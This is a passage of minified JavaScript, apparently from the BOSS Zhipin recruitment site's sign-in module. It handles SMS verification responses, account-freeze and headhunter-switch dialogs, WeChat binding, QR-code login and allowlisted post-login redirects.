        else if (4e5 < n.code && n.code < 401e3)
            if (Sign.tooLongCode.indexOf(n.code)) {
                var c = "";
                switch (n.code) {
                case 400026:
                    c = "根据相关法律规定，因您未满16周岁，暂不支持使用，直至您年满16周岁账号自动解冻！";
                    break;
                case 400027:
                    c = "账号已冻结，请登录BOSS直聘 APP 按照提示完成解冻操作。";
                    break;
                case 400021:
                    c = "该手机号已注销，无法注册";
                    break;
                case 400033:
                case 400034:
                    c = "您的账户存在安全隐患，请使用短信验证码登录。";
                    break;
                default:
                    c = n.message
                }
                $.dialog({
                    title: "提示",
                    content: c,
                    closeText: !0,
                    cancelText: "",
                    confirmText: "知道了",
                    wrapClass: "dialog-prop-default",
                    onConfirm: function(e) {
                        e.remove()
                    }
                }),
                i && t.html("发送验证码").removeClass("btn-disabled"),
                e.find(".ipt-code").val("")
            } else
                Sign.showError(e, n.message, !0),
                i && t.html("发送验证码").removeClass("btn-disabled"),
                e.find(".ipt-code").val("");
        else
            4e3 < n.code && n.code < 5e3 ? 4002 === n.code ? (a = "400-065-5799",
            o = "https://lie.zhipin.com",
            n.zpData && (n.zpData.link && (o = n.zpData.link),
            n.zpData.tel && (a = function(e, t) {
                for (var i, n, a = $.trim(e), o = "", s = "", r = 0, c = 0, s = (i = -1 < t.indexOf("-") ? t.split("-") : t.split(" "),
                "-"), r = 0; r < i.length; r++)
                    n = c + Number(i[r]),
                    o += a.substring(c, n),
                    r < i.length - 1 && (o += s),
                    c = n;
                return o
            }(n.zpData.tel, "3-3-4"))),
            $.dialog({
                title: "暂不支持登陆",
                content: "您已注册BOSS直聘直猎邦，请前往直猎邦使用。若您已不是猎头，可致电客服注销猎头身份。",
                closeText: !0,
                cancelText: "联系客服",
                confirmText: "前往直猎邦",
                wrapClass: "dialog-prop-default",
                onConfirm: function(e) {
                    e.remove(),
                    window.open(o)
                },
                onCancel: function(e) {
                    e.remove(),
                    $.dialog({
                        title: "",
                        content: "客服热线：" + a,
                        closeText: !0,
                        cancelText: !1,
                        confirmText: "知道了",
                        wrapClass: "dialog-prop-default",
                        onConfirm: function(e) {
                            e.remove()
                        },
                        onCancel: function(e) {
                            e.remove()
                        }
                    })
                }
            })) : (Sign.tooLongCode.indexOf(n.code) ? (c = "",
            n.code,
            c = n.message,
            $.dialog({
                title: "提示",
                content: c,
                closeText: !0,
                cancelText: "",
                confirmText: "知道了",
                wrapClass: "dialog-prop-default",
                onConfirm: function(e) {
                    e.remove()
                }
            })) : Sign.showError(e, n.message, !0),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val("")) : 5100 < n.code && n.message ? $.toast({
                content: n.message,
                type: "error"
            }) : (Sign.showError(e, n.message, !0),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""))
    },
    dealSignResultOld: function(t, e, i, n, a, o) {
        var s = "/registe/headhunter/save.json" == t.attr("action") || "/registe/save.json" == t.attr("action");
        if ((1 != o.rescode && 6 != o.rescode || 2 == o.type && s || 4 == o.type) && (VerrifyCode.reset(t.find(".row-code")),
        t.find(".row-code").is(":visible") && (t.find(".row-code").html(""),
        new VerifyCodeSDK({
            dom: t.find(".row-code")[0],
            success: function(e) {
                Sign.VerrifySuccessCallback(e)
            },
            ready: function(e) {
                Sign.VerrifyReadyCallback(e)
            },
            fail: function(e) {
                try {
                    t.find("input[name=phone]").val();
                    e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                } catch (e) {}
            }
        }))),
        1 == o.rescode) {
            if (e.hasClass("sign-pwd") && Sign.callbackPwd(t, o),
            e.hasClass("sign-sms"))
                if (a)
                    if (2 == o.type)
                        if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                        Sign.countDown(i, function() {
                            i.html("发送验证码").removeClass("count-down btn-disabled")
                        }),
                        i.parent().find(".ipt-sms").focus(),
                        4 == o.errorType) {
                            Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                            try {
                                _T.sendEvent("signin_sms_send_lot")
                            } catch (e) {}
                        } else
                            try {
                                _T.sendEvent("signin_sms_send_sms")
                            } catch (e) {}
                    else
                        Sign.showError(t, o.resmsg, !0),
                        i.html("发送验证码").removeClass("count-down btn-disabled");
                else
                    Sign.callbackSms(t, o);
            if (e.hasClass("sign-register"))
                if (a)
                    if (2 == o.type)
                        Sign.showError(t, o.resmsg, !0),
                        i.html("发送验证码").removeClass("count-down btn-disabled");
                    else if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                    Sign.countDown(i, function() {
                        i.html("发送验证码").removeClass("count-down btn-disabled")
                    }),
                    i.parent().find(".ipt-sms").focus(),
                    4 == o.errorType) {
                        Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                        try {
                            _T.sendEvent("signin_sms_send_lot")
                        } catch (e) {}
                    } else {
                        t.append('<input type="hidden" name="rescode" value="1" />');
                        try {
                            _T.sendEvent("signin_sms_send_sms")
                        } catch (e) {}
                    }
                else
                    "function" == typeof _PAGE.RegisterCallback ? _PAGE.RegisterCallback() : QuickSign.callbackRegister(t, o);
            if (e.hasClass("sign-bind-wechat-signin"))
                if (a)
                    if (2 == o.type)
                        if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                        Sign.countDown(i, function() {
                            i.html("发送验证码").removeClass("count-down btn-disabled")
                        }),
                        i.parent().find(".ipt-sms").focus(),
                        4 == o.errorType) {
                            Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                            try {
                                _T.sendEvent("signin_sms_send_lot")
                            } catch (e) {}
                        } else
                            try {
                                _T.sendEvent("signin_sms_send_sms")
                            } catch (e) {}
                    else
                        Sign.showError(t, o.resmsg, !0),
                        i.html("发送验证码").removeClass("count-down btn-disabled");
                else
                    Sign.callbackWechatBind(t, o);
            if (e.hasClass("sign-bind-wechat-signup"))
                if (a)
                    if (2 == o.type)
                        Sign.showError(t, o.resmsg, !0),
                        i.html("发送验证码").removeClass("count-down btn-disabled");
                    else {
                        i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                        Sign.countDown(i, function() {
                            i.html("发送验证码").removeClass("count-down btn-disabled")
                        }),
                        i.parent().find(".ipt-sms").focus();
                        try {
                            _T.sendEvent("signin_register_send_sms")
                        } catch (e) {}
                    }
                else
                    Sign.callbackWechatBindRegister(t, o);
            if (e.hasClass("sign-resume"))
                if (a)
                    if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                    Sign.countDown(i, function() {
                        i.html("发送验证码").removeClass("count-down btn-disabled")
                    }),
                    i.parent().find(".ipt-sms").focus(),
                    4 == o.errorType) {
                        Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                        try {
                            _T.sendEvent("signin_sms_send_lot")
                        } catch (e) {}
                    } else
                        try {
                            _T.sendEvent("signin_sms_send_sms")
                        } catch (e) {}
                else
                    AnalysisResume.signOrRegisterCallback(t, o);
            if (e.hasClass("sign-quick"))
                if (a)
                    if (2 == o.type)
                        Sign.showError(t, o.resmsg, !0),
                        i.html("发送验证码").removeClass("count-down btn-disabled");
                    else if (i.html('已发送 <em class="num">60s</em>').addClass("count-down btn-disabled"),
                    Sign.countDown(i, function() {
                        i.html("发送验证码").removeClass("count-down btn-disabled")
                    }),
                    i.parent().find(".ipt-sms").focus(),
                    4 == o.errorType) {
                        Sign.showError(t, "获取验证码过于频繁，请稍后再试", !0);
                        try {
                            _T.sendEvent("signin_sms_send_lot")
                        } catch (e) {}
                    } else {
                        t.append('<input type="hidden" name="rescode" value="1" />');
                        try {
                            _T.sendEvent("signin_sms_send_sms")
                        } catch (e) {}
                    }
                else
                    QuickSign.callbackRegister(t, o)
        } else
            Sign.dealSignFailOld(t, i, a, o);
        a || n.removeClass("btn-disabled")
    },
    dealSignFailOld: function(e, t, i, n) {
        if (0 == n.rescode) {
            var a = {
                content: n.resmsg,
                confirmButton: "知道了",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                }
            };
            Sign.showConfirm(a),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click()
        } else if (7 == n.rescode || 8 == n.rescode) {
            if (7 == n.rescode && 2 == n.bizcode)
                a = {
                    content: '<div class="sign-hunter-gray">如果您是猎头，请请拨打客服电话：400-0655-799进行申诉。同事已经注册成功Boss直聘猎头版，请将TA的手机号提供给客服。</div>',
                    title: "此账号在BOSS直聘被多次举报，暂不支持使用",
                    confirmButton: "知道了",
                    columnClass: "pop-sign-hunter"
                };
            else if (7 != n.rescode || 3 != n.bizcode && 4 != n.bizcode)
                if (7 != n.rescode || 6 != n.bizcode && 8 != n.bizcode)
                    if (7 == n.rescode && 5 == n.bizcode)
                        a = {
                            content: '<div class="sign-hunter-gray">如果您是猎头，请请拨打客服电话：400-0655-799进行申诉。同事已经注册成功Boss直聘猎头版，请将TA的手机号提供给客服。</div>',
                            title: "此账号在BOSS直聘被多次举报，暂不支持使用",
                            confirmButton: "知道了",
                            columnClass: "pop-sign-hunter"
                        };
                    else if (7 == n.rescode && 11 == n.bizcode) {
                        try {
                            _T.sendEvent("hunter_account_freeze")
                        } catch (e) {}
                        a = {
                            content: '<div class="sign-hunter-gray">由于您的账号涉及违规，暂不支持使用。</div>',
                            title: "账号锁定",
                            confirmButton: "知道了",
                            columnClass: "pop-sign-hunter"
                        }
                    } else if (7 == n.rescode && 12 == n.bizcode) {
                        try {
                            _T.sendEvent("hunter_account_locked")
                        } catch (e) {}
                        a = {
                            content: '<div class="sign-hunter-gray">                            <i class="icon-fail"></i>                            <div class="freeze-container"><p class="reject-title">非常抱歉，您的账号已被冻结</p>                            <p class="reject-reason">' + n.resmsg + '</p>                            <p>您可以通过以下方式申诉</p>                            <div class="reject-content">                            请使用邮箱：' + n.userEmail + "<br />发送邮件至boss@kanzhun.com<br />                            邮件标题格式：冻结申诉+您的注册手机号<br />                            邮件内容请填写您的公司全称和其他申诉内容                            </div></div>                            </div>",
                            title: "",
                            closeIcon: !0,
                            confirmButton: "知道了",
                            columnClass: "pop-sign-hunter sign-freeze"
                        }
                    } else
                        a = {
                            content: n.resmsg,
                            confirmButton: "知道了",
                            openCallback: function(e) {
                                e.$confirmButton.parent().css("text-align", "center")
                            }
                        };
                else
                    var a = {
                        content: '<div class="sign-hunter-gray">您的BOSS直聘账户中有未使用的道具、未消耗的直豆或钱包中有退款，切换为猎头身份后将无法使用。<br />\t\t\t\t\t\t\t请先登录APP将付费产品消耗或领取红包，再重新登录猎头端。</div>',
                        title: "请您先清空付费产品、直豆或领取红包",
                        confirmButton: "知道了",
                        columnClass: "pop-sign-hunter"
                    };
            else
                var a = {
                    content: '<div class="sign-hunter-gray">您的BOSS直聘账户中有未使用的道具、或钱包中有退款，切换为猎头身份后将无法使用。<br />\t\t\t\t\t\t\t请先登录APP将付费产品消耗或领取红包，再重新登录猎头端。</div>',
                    title: "请您先清空付费产品或领取红包",
                    confirmButton: "知道了",
                    columnClass: "pop-sign-hunter"
                };
            Sign.showConfirm(a),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click()
        } else if (9 == n.rescode)
            1 == n.bizcode || 0 == n.bizcode ? Sign.showConfirm(a = {
                content: '<p>您当前身份为BOSS，是否切换为猎头？</p><ul class="pop-content"><li>为牛人服务，严禁猎头冒充BOSS</li><li>切换为猎头身份后，您将获得BOSS直聘的高端牛人简历，享有更具竞争力的猎头会员服务。</li><li>猎头身份生效后，您不能以BOSS身份登录APP</li></ul>',
                title: "您将要切换为猎头身份",
                cancelButton: "取消",
                confirmButton: "切换为猎头",
                columnClass: "pop-sign-hunter",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                },
                confirmCallback: function() {
                    window.location.href = "/user/transto/headhunter.html?token=" + n.token
                },
                cancelCallback: function() {
                    window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                }
            }) : 7 == n.bizcode ? Sign.showConfirm(a = {
                content: '<p>您当前系统身份为牛人，是否切换为猎头？</p><ul class="pop-content"><li>切换为猎头身份后，您将获得BOSS直聘的高端牛人简历，享有更具竞争力的猎头会员服务。</li><li>猎头身份生效后，您不能以牛人身份登录APP</li></ul>',
                title: "您将要切换为猎头身份",
                cancelButton: "取消",
                confirmButton: "切换为猎头",
                columnClass: "pop-sign-hunter",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                },
                confirmCallback: function() {
                    window.location.href = "/user/transto/headhunter.html?token=" + n.token
                },
                cancelCallback: function() {
                    window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                }
            }) : 6 == n.bizcode || 8 == n.bizcode ? (a = {
                content: '<p>您已注册过BOSS直聘，是否切换为猎头身份？</p><ul class="pop-content"><li>为牛人服务，严禁猎头冒充BOSS</li><li>切换为猎头身份后，您将获得BOSS直聘的高端牛人简历，享有更具竞争力的猎头会员服务。</li><li class="bold">您的BOSS直聘账户中剩余' + n.beancount + "个直豆，切换为猎头身份后无法使用。但直豆仍会保留。</li><li>猎头身份生效后，您不能以牛人或BOSS身份登录APP</li></ul>",
                title: "您将要切换为猎头身份",
                cancelButton: "取消",
                confirmButton: "切换为猎头",
                columnClass: "pop-sign-hunter",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                },
                confirmCallback: function() {
                    window.location.href = "/user/transto/headhunter.html?token=" + n.token
                },
                cancelCallback: function() {
                    window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                }
            },
            Sign.showConfirm(a)) : -1 == n.rescode ? Sign.showError(e, n.resmsg) : Sign.showConfirm(a = {
                content: '<p>您当前身份为BOSS，请选择是否将身份切换为猎头</p><ul class="pop-content"><li>选择猎头身份后，您将以猎头身份发布职位、搜索查看\t简历、更高效的联系牛人</li><li>猎头身份与BOSS身份只可选择一个，选择猎头身份后，不能再以Boss身份登录</li></ul>',
                title: "选择身份",
                cancelButton: "取消",
                confirmButton: "切换为猎头",
                columnClass: "pop-sign-hunter",
                openCallback: function(e) {
                    e.$confirmButton.parent().css("text-align", "center")
                },
                confirmCallback: function() {
                    window.location.href = "/user/transto/headhunter.html?token=" + n.token
                },
                cancelCallback: function() {
                    window.location.href = "https://www.zhipin.com/web/zppassport/logout?toUrl=https://lie.zhipin.com"
                }
            }),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click();
        else if (6 == n.rescode)
            Sign.showError(e, "短信验证码错误", !0);
        else if (10002 == n.rescode)
            $.dialog({
                title: "",
                content: '<div style="padding: 4px 0 30px;">请切换至牛人身份，再重新尝试</div>',
                type: "error",
                closeText: !0,
                confirmText: "确定",
                cancelText: !1,
                preKa: "",
                wrapClass: "dialog-icons-default",
                lock: !0
            });
        else if (10004 == n.rescode)
            $.dialog({
                title: "",
                content: '<div style="padding: 4px 0 30px;">您的简历信息已完善，直接去登录即可 </div>',
                type: "error",
                closeText: !0,
                confirmText: "确定",
                cancelText: !1,
                preKa: "",
                wrapClass: "dialog-icons-default",
                lock: !0
            });
        else if (400023 == n.rescode)
            UserCheck.checkPhone("/login/phone.json", null, e.find("input[name=account]").val(), e.find("input[name=regionCode]").val());
        else if (400046 == n.rescode)
            $.dialog({
                title: "绑定失败",
                content: "您当前使用的微信号已绑定过BOSS直聘账号，请登录其他微信号再重试",
                closeText: !0,
                cancelText: "",
                confirmText: "知道了",
                wrapClass: "dialog-prop-default pop-sign-wechat",
                onConfirm: function(e) {
                    e.remove()
                }
            }),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click();
        else if (400041 == n.rescode)
            $.dialog({
                title: "绑定失败",
                content: "当前BOSS直聘账号已绑定过微信，可直接使用关联的微信扫码登录",
                closeText: !0,
                cancelText: "",
                confirmText: "知道了",
                wrapClass: "dialog-prop-default pop-sign-wechat",
                onConfirm: function(e) {
                    e.remove()
                }
            }),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val(""),
            e.find(".verifyimg").click();
        else if (4e5 < n.rescode && n.rescode < 401e3)
            if (400031 == n.rescode)
                Sign.showError(e, n.resmsg, !0);
            else {
                var o = "";
                switch (n.rescode) {
                case 400026:
                    o = "根据相关法律规定，因您未满16周岁，暂不支持使用，直至您年满16周岁账号自动解冻！";
                    break;
                case 400027:
                    o = "账号已冻结，请登录BOSS直聘 APP 按照提示完成解冻操作。";
                    break;
                case 400021:
                    o = "该手机号已注销，无法注册";
                    break;
                case 400033:
                case 400034:
                    o = "您的账户存在安全隐患，请使用短信验证码登录。";
                    break;
                default:
                    o = n.resmsg
                }
                $.dialog({
                    title: "提示",
                    content: o,
                    closeText: !0,
                    cancelText: "",
                    confirmText: "知道了",
                    wrapClass: "dialog-prop-default",
                    onConfirm: function(e) {
                        e.remove()
                    }
                }),
                i && t.html("发送验证码").removeClass("btn-disabled"),
                e.find(".ipt-code").val("")
            }
        else
            Sign.showError(e, n.resmsg, !0),
            i && t.html("发送验证码").removeClass("btn-disabled"),
            e.find(".ipt-code").val("")
    },
    isSafeUrl: function(e) {
        var t = -1 < window.location.host.indexOf("weizhipin.com") ? ["weizhipin.com"] : ["zhipin.com"]
          , e = ((e || "").replace(/^(https?)?(:?\/\/+)([^\/?]*)(.*)?$/, "$3") || "").split(".").slice(-2).join(".");
        return -1 < t.indexOf(e)
    },
    safeJump: function(e) {
        var t;
        Sign.isSafeUrl(e) ? window.location.href = e : (e = -1 < window.location.host.indexOf("weizhipin.com"),
        t = -1 < window.location.host.indexOf("pre-www.zhipin.com"),
        window.location.href = e ? "https://boss-m-qa.weizhipin.com" : t ? "https://pre-www.zhipin.com" : "https://www.zhipin.com")
    },
    callbackPwd: function(e, t) {
        try {
            _T.sendEvent(e.closest(".sign-form").data("flow") + "_done")
        } catch (e) {}
        t.commonDevice ? (e = t.webHost + "/web/geek/user-safe?uuid=" + t.uuid,
        LOGIN_SOURCE && LOGIN_SOURCE_URL && (e = e + "&from=" + LOGIN_SOURCE + "&fromUrl=" + LOGIN_SOURCE_URL),
        window.location.href = e) : LOGIN_SOURCE && LOGIN_SOURCE_URL ? Sign.safeJump(LOGIN_SOURCE_URL) : Sign.source ? "url" == Sign.source ? Sign.safeJump(Sign.directUrls[Sign.source]) : window.location.href = Sign.setWxUrlRandomParam(Sign.directUrls[Sign.source]) : isZpdesk && 1 != t.identity ? Sign.showDeskGeekTip() : ($(".semwrap").length && (window.location.href = "/"),
        LOGIN_SOURCE && "live" == LOGIN_SOURCE ? window.location.href = Sign.getLiveUrl() : 1 == t.identity ? 0 == t.compStep ? window.location.href = decodeURIComponent(t.toUrl) : 1 == t.compStep ? window.location.href = t.webHost + "/web/boss/guide/" : 2 == t.compStep && (window.location.href = t.webHost + "/web/boss/guide/job/") : t.toUrl ? window.location.href = Sign.setWxUrlRandomParam(decodeURIComponent(t.toUrl)) : 1 == t.identity ? window.location.href = Sign.setWxUrlRandomParam("https://www.zhipin.com/web/chat/index") : $(".page-sign").length ? window.location.href = Sign.setWxUrlRandomParam("https://www.zhipin.com/") : window.location.href = Sign.setWxUrlRandomParam(window.location.href))
    },
    callbackSms: function(e, t) {
        e.closest(".sign-form").find(".tip-error");
        try {
            _T.sendEvent(e.closest(".sign-form").data("flow") + "_done")
        } catch (e) {}
        t.commonDevice ? (e = t.webHost + "/web/geek/user-safe?uuid=" + t.uuid,
        LOGIN_SOURCE && LOGIN_SOURCE_URL && (e = e + "&from=" + LOGIN_SOURCE + "&fromUrl=" + LOGIN_SOURCE_URL),
        window.location.href = e) : LOGIN_SOURCE && LOGIN_SOURCE_URL ? Sign.safeJump(LOGIN_SOURCE_URL) : Sign.source ? "url" == Sign.source ? Sign.safeJump(Sign.directUrls[Sign.source]) : window.location.href = Sign.directUrls[Sign.source] : isZpdesk && 1 != t.identity ? Sign.showDeskGeekTip() : $(".semwrap").length ? window.location.href = "/" : LOGIN_SOURCE && "live" == LOGIN_SOURCE ? window.location.href = Sign.getLiveUrl() : 1 == t.identity ? 0 == t.compStep ? window.location.href = decodeURIComponent(t.toUrl) : 1 == t.compStep ? window.location.href = t.webHost + "/web/boss/guide/" : 2 == t.compStep && (window.location.href = t.webHost + "/web/boss/guide/job/") : t.toUrl ? window.location.href = Sign.setWxUrlRandomParam(decodeURIComponent(t.toUrl)) : 1 == t.identity ? window.location.href = Sign.setWxUrlRandomParam("https://www.zhipin.com/web/chat/index") : $(".page-sign").length ? window.location.href = Sign.setWxUrlRandomParam("https://www.zhipin.com/") : window.location.href = Sign.setWxUrlRandomParam(window.location.href)
    },
    callbackWechatBind: function(e, t) {
        try {
            _T.sendEvent(e.closest(".sign-form").data("flow") + "_done")
        } catch (e) {}
        LOGIN_SOURCE && LOGIN_SOURCE_URL ? Sign.safeJump(LOGIN_SOURCE_URL) : Sign.source ? "url" == Sign.source ? Sign.safeJump(Sign.directUrls[Sign.source]) : window.location.href = Sign.directUrls[Sign.source] : isZpdesk && 1 != t.identity ? Sign.showDeskGeekTip() : LOGIN_SOURCE && "live" == LOGIN_SOURCE ? window.location.href = Sign.getLiveUrl() : t.toUrl ? window.location.href = Sign.setWxUrlRandomParam(decodeURIComponent(t.toUrl)) : 1 == t.identity ? window.location.href = Sign.setWxUrlRandomParam("https://www.zhipin.com/web/chat/index") : $(".page-sign").length ? window.location.href = Sign.setWxUrlRandomParam("https://www.zhipin.com/") : window.location.href = Sign.setWxUrlRandomParam(window.location.href)
    },
    callbackWechatBindRegister: function(e, t) {
        var i = $(".sign-wrap")
          , n = "g";
        "1" == e.find('input[name="purpose"]').val() && (n = "b");
        try {
            _T.sendEvent(e.closest(".sign-form").data("flow") + "_done_" + n)
        } catch (e) {}
        e.closest(".pop-sign-box").length && (i = e.closest(".pop-sign-box")),
        LOGIN_SOURCE && LOGIN_SOURCE_URL ? Sign.safeJump(LOGIN_SOURCE_URL) : LOGIN_SOURCE && "live" == LOGIN_SOURCE ? window.location.href = Sign.getLiveUrl() : t.toUrl ? ($.toast({
            content: "注册成功，正在为您跳转到完善页面",
            type: "success"
        }),
        n = "",
        n = -1 != t.toUrl.indexOf("http") ? t.toUrl : "https://www.zhipin.com" + t.toUrl,
        window.location.href = decodeURIComponent(n)) : Sign.source ? ($.toast({
            content: "注册成功",
            type: "success"
        }),
        setTimeout(function() {
            "url" == Sign.source ? Sign.safeJump(Sign.directUrls[Sign.source]) : window.location.href = Sign.directUrls[Sign.source]
        }, 3e3)) : Sign.showPannel(i, "welcome")
    },
    callbackRegister: function(e, t) {
        var i, n = $(".sign-wrap"), a = "g";
        "1" == e.find('input[name="purpose"]').val() && (a = "b");
        try {
            _T.sendEvent(e.closest(".sign-form").data("flow") + "_done_" + a)
        } catch (e) {}
        e.closest(".pop-sign-box").length && (n = e.closest(".pop-sign-box")),
        t.commonDevice ? (i = t.webHost + "/web/geek/user-safe?uuid=" + t.uuid,
        LOGIN_SOURCE && LOGIN_SOURCE_URL && (i = i + "&from=" + LOGIN_SOURCE + "&fromUrl=" + LOGIN_SOURCE_URL),
        window.location.href = i) : LOGIN_SOURCE && LOGIN_SOURCE_URL ? Sign.safeJump(LOGIN_SOURCE_URL) : LOGIN_SOURCE && "live" == LOGIN_SOURCE ? window.location.href = Sign.getLiveUrl() : t.toUrl ? ($.toast({
            content: "注册成功，自动跳转完善页面",
            type: "success"
        }),
        i = "",
        i = -1 != t.toUrl.indexOf("http") ? t.toUrl : "https://www.zhipin.com" + t.toUrl,
        window.location.href = decodeURIComponent(i)) : Sign.source ? ($.toast({
            content: "注册成功",
            type: "success"
        }),
        "url" == Sign.source ? Sign.safeJump(Sign.directUrls[Sign.source]) : window.location.href = Sign.directUrls[Sign.source]) : Sign.showPannel(n, "welcome")
    },
    addScanGuide: function() {
        $(".download-btn").hover(function() {
            $(".app-load-box").show().stop().animate({
                "margin-left": "0px",
                opacity: 1
            }, 200)
        }, function() {
            $(".app-load-box").stop().animate({
                "margin-left": "-10px",
                opacity: 0
            }, 200, function() {
                $(".app-load-box").hide()
            })
        }),
        $(".page-sign .sign-wrap-v2 .scan-switch").on("click", function() {
            Sign.showPannel($(".page-sign .sign-wrap"), "scan")
        }),
        $(".page-sign .sign-wrap-v2 .pwd-switch").on("click", function() {
            Sign.showPannel($(".page-sign .sign-wrap"), "sms")
        }),
        $(".page-sign .sign-wrap-v2 .scan-login-btn").on("click", function() {
            Sign.showPannel($(".page-sign .sign-wrap"), "scan")
        }),
        $(".page-sign .sign-wrap-v2 .pwd-login-btn").on("click", function() {
            Sign.showPannel($(".page-sign .sign-wrap"), "sms")
        })
    },
    callbackCheckRegister: function(e, t) {
        try {
            _T.sendEvent(e.closest(".sign-form").data("flow") + "_done")
        } catch (e) {}
        var i = e.parents(".login-wechat").find(".bind-box")
          , n = i.find("form")
          , a = i.find('form .btn[type="submit"]');
        e.parents(".login-wechat .register-box").addClass("hide"),
        i.removeClass("hide"),
        i.find(".ipt-phone").val(t.account),
        Sign.init(i),
        t.isRegistered ? (n.attr("action", "/login/headhunter/phone.json"),
        n.find('input[name="smsType"]').val(4),
        a.text("登录，并绑定手机号")) : (n.attr("action", "/registe/headhunter/save.json"),
        n.parents(".sign-form").removeClass(".sign-sms"),
        n.find('input[name="smsType"]').val(5),
        a.text("注册"),
        n.parents(".sign-form").removeClass("sign-sms").addClass("sign-register"))
    },
    showConfirm: function(e) {
        $.confirm({
            content: e.content,
            title: e.title,
            closeIcon: e.closeIcon || !1,
            cancelButton: e.cancelButton || !1,
            confirmButton: e.confirmButton || !1,
            columnClass: e.columnClass || "defaultConfirm",
            backgroundDismiss: !1,
            onOpen: function() {
                e.openCallback && e.openCallback(this)
            },
            confirm: function() {
                e.confirmCallback && e.confirmCallback()
            },
            cancel: function() {
                e.cancelCallback && e.cancelCallback()
            }
        })
    },
    showError: function(e, t, i) {
        var n = e.closest(".sign-form")
          , e = e.closest(".form-row").find(".tip-error");
        if ((e = (e = e.length ? e : n.find(".tip-error-form")).length ? e : n.find(".tip-error").eq(0)).text(t).show(),
        "短信验证码错误" == t && n.find(".ipt-sms").focus().val(""),
        i)
            try {
                _T.sendEvent(n.closest(".sign-form").data("flow") + "_error")
            } catch (e) {}
        isTouch && $(window).width() < 800 && Sign.showToast(t),
        (n.hasClass("sign-bind-wechat-signin") || n.hasClass("sign-bind-wechat-signup")) && $.toast({
            type: "error",
            content: t
        })
    },
    hideError: function(e) {
        var t = e.find(".tip-error");
        (t = t.length ? t : e.closest(".sign-form").find(".tip-error")).text(""),
        (e.closest(".sign-wrap").hasClass("sign-wrap-v2") || e.closest(".pop-sign-box").hasClass("sign-wrap-v2")) && t.hide()
    },
    showToast: function(e) {
        var t = $('<div class="toast"><p>' + e + "</p></div>");
        $(".toast").length && $(".toast").remove(),
        Sign.timerToast && clearTimeout(Sign.timerToast),
        $("body").append(t),
        $(".toast").show(),
        Sign.timerToast = setTimeout(function() {
            Sign.hideToast(t)
        }, 2e3)
    },
    hideToast: function() {
        $(".toast").fadeOut(function() {
            $(".toast").remove()
        })
    },
    countDown: function(e, t) {
        var i = parseInt(e.find(".num").text().replace("s"), 10);
        Sign.interCount = setInterval(function() {
            i--,
            e.find(".num").text(i + "s"),
            i <= 0 && (t(),
            clearInterval(Sign.interCount),
            Sign.interCount = null)
        }, 1e3)
    },
    scanValid: function() {
        Sign.timer = setTimeout(function() {
            $(".sign-scan .invalid-box").show()
        }, 18e4)
    },
    scanJump: function(i, e, n, a) {
        try {
            Sign.enterLoginPageTime && _T.sendEvent("login-flow-done-time", ((new Date).getTime() - Sign.enterLoginPageTime) / 1e3 + "")
        } catch (e) {}
        e = {
            qrId: e
        };
        window.BossZhipinBridge && (e.environment = "BossZhipinBridge"),
        e.pk = getQueryString("ka") || $("#page_key_name").val(),
        $.ajax({
            type: "GET",
            url: "/wapi/zppassport/qrcode/dispatcher",
            data: e,
            dataType: "json",
            cache: !1,
            timeout: 1e5,
            success: function(e) {
                if (Sign.action({
                    action: "user-sao-success"
                }),
                0 != e.code)
                    return !$(".semwrap").length && (-1 < Sign.loginLimitCode.indexOf(e.code) || 4942 <= e.code && e.code <= 4950) ? void Sign.loginLimitTip(e.code, {
                        message: e.message,
                        closeCallback: function() {
                            window.location.reload()
                        }
                    }) : void $.dialog({
                        title: "提示",
                        content: e.message || "登录失败",
                        closeText: !0,
                        cancelText: "",
                        confirmText: "知道了",
                        wrapClass: "dialog-prop-default",
                        onConfirm: function(e) {
                            e.remove(),
                            location.reload()
                        },
                        onClose: function() {
                            location.reload()
                        }
                    });
                var t, e = e.zpData || {};
                a = e.youleUrl || (1 == e.identity ? e.pcToUrl : e.toUrl),
                LOGIN_SOURCE && LOGIN_SOURCE_URL ? Sign.safeJump(LOGIN_SOURCE_URL) : LOGIN_SOURCE && "live" == LOGIN_SOURCE ? window.location.href = Sign.getLiveUrl() : (t = "",
                $(".semwrap").length && (t = -1 < a.indexOf("?") ? "&jumpUrl=/" : "?jumpUrl=/"),
                e = i.find(".sign-scan").length ? i.find(".sign-scan").data("flow") : "web",
                "validate"in n && n.validate ? (Sign.sendKaEvent(e + "_done"),
                isZpdesk ? Sign.checkDeskIsBoss(function(e) {
                    1 == e ? window.location.href = a : Sign.showDeskGeekTip()
                }) : window.location.href = a + t) : "allweb"in n && n.allweb ? (Sign.sendKaEvent(e + "_done"),
                isZpdesk ? Sign.checkDeskIsBoss(function(e) {
                    1 == e ? window.location.href = a + t : Sign.showDeskGeekTip()
                }) : window.location.href = a + t) : ("validate"in n && n.validate,
                Sign.sendKaEvent(e + "_error"),
